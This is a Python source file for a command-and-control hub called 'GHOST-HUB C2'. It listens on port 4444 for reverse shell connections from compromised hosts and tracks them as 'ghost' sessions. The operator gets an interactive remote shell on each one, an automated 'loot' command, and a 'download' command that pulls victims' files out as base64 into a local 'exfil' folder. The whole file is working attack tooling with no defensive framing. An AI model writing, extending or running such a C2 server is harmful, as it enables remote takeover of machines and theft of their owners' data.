import socket
import threading
import base64
import os
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header
from modules.looter import run_looter 

console = Console()

class GhostHub:
    def __init__(self):
        # Format: {id: {'sock': socket, 'ip': str, 'port': int}}
        self.sessions = {}
        self.counter = 1
        self.running = True

    def interact(self, s_id):
        """
        Interactive shell for a specific session.
        Supports automated looting and binary-safe file exfiltration.
        """
        if s_id not in self.sessions:
            return console.print(f"[red][!] Session {s_id} does not exist.[/red]")

        session = self.sessions[s_id]
        sock = session['sock']
        sock.settimeout(10) # Prevent hanging on network lag

        console.print(Panel(
            f"Connected to: [bold cyan]{session['ip']}[/bold cyan]\n"
            "Commands: [bold green]loot[/bold green], [bold green]download <path>[/bold green], [bold green]back[/bold green], [bold green]terminate[/bold green]",
            title=f"Session {s_id} Intelligence",
            border_style="red"
        ))
        
        while True:
            try:
                cmd = console.input(f"[bold red]Ghost-{s_id}[/bold red]> ").strip()
                
                if not cmd:
                    continue
                if cmd == "back":
                    break
                
                if cmd == "terminate":
                    sock.close()
                    del self.sessions[s_id]
                    console.print(f"[yellow][*] Session {s_id} terminated.[/yellow]")
                    break

                if cmd == "loot":
                    console.print("[yellow][*] Triggering automated looting engine...[/yellow]")
                    results = run_looter(sock)
                    console.print(Panel(str(results), title="Looter Report", border_style="green"))
                
                elif cmd.startswith("download "):
                    try:
                        remote_path = cmd.split(" ", 1)[1]
                        filename = remote_path.split("/")[-1] if "/" in remote_path else remote_path
                        
                        # Command the ghost to send file as base64
                        sock.send(f"cat {remote_path} | base64\n".encode())
                        
                        # Receive and clean the data
                        raw_data = b""
                        while True:
                            chunk = sock.recv(8192)
                            raw_data += chunk
                            if len(chunk) < 8192:
                                break
                        
                        # Decode and save
                        if not os.path.exists("exfil"):
                            os.makedirs("exfil")
                        
                        decoded_data = base64.b64decode(raw_data.strip())
                        save_path = f"exfil/{s_id}_{filename}"
                        
                        with open(save_path, "wb") as f:
                            f.write(decoded_data)
                        
                        console.print(f"[bold green][+] File exfiltrated and decrypted: {save_path}[/bold green]")
                    except Exception as e:
                        console.print(f"[red][!] Download failed: {e}[/red]")
                
                else:
                    # Standard shell command execution
                    sock.send((cmd + "\n").encode())
                    response = sock.recv(16384).decode('utf-8', errors='ignore')
                    console.print(response)

            except socket.timeout:
                console.print("[yellow][!] Response timed out. Host might be slow.[/yellow]")
            except Exception as e:
                console.print(f"[red][!] Session error: {e}[/red]")
                break

    def start_hub(self, port=4444):
        """Listens for incoming reverse TCP connections."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind(("0.0.0.0", int(port)))
            server.listen(25)
            console.print(f"[bold green][*] C2 Hub listening on port {port}...[/bold green]")
            
            while self.running:
                conn, addr = server.accept()
                s_id = self.counter
                self.sessions[s_id] = {
                    'sock': conn, 
                    'ip': addr[0], 
                    'port': addr[1]
                }
                self.counter += 1
                console.print(f"\n[bold green][!] NEW GHOST CONNECTED: {addr[0]} (ID: {s_id})[/bold green]")
        except Exception as e:
            console.print(f"[bold red][!] Hub Startup Failed: {e}[/bold red]")

def run_ghost_hub():
    hub = GhostHub()
    draw_header("GHOST-HUB C2")
    
    listen_port = console.input("[bold yellow]Listen Port [4444]: [/bold yellow]") or "4444"
    
    # Start the listener thread
    listener = threading.Thread(target=hub.start_hub, args=(listen_port,), daemon=True)
    listener.start()

    while True:
        # Clear/Refresh the session table
        table = Table(title="Ghost Command & Control Sessions", border_style="red")
        table.add_column("ID", justify="center", style="cyan")
        table.add_column("IP Address", style="magenta")
        table.add_column("Status", style="green")
        
        for sid, data in hub.sessions.items():
            table.add_row(str(sid), data['ip'], "ACTIVE")
        
        console.print(table)
        console.print("[dim]Commands: interact <ID>, exit[/dim]")

        user_input = console.input("\n[bold white][hub][/bold white]> ").strip().split()
        
        if not user_input:
            continue
            
        cmd = user_input[0].lower()
        
        if cmd == "interact":
            try:
                hub.interact(int(user_input[1]))
            except (ValueError, IndexError):
                console.print("[red][!] Usage: interact <ID>[/red]")
        elif cmd == "exit":
            hub.running = False
            console.print("[yellow][*] Shutting down C2 Hub.[/yellow]")
            break
        else:
            console.print(f"[red][!] Unknown command: {cmd}[/red]")

if __name__ == "__main__":
    run_ghost_hub()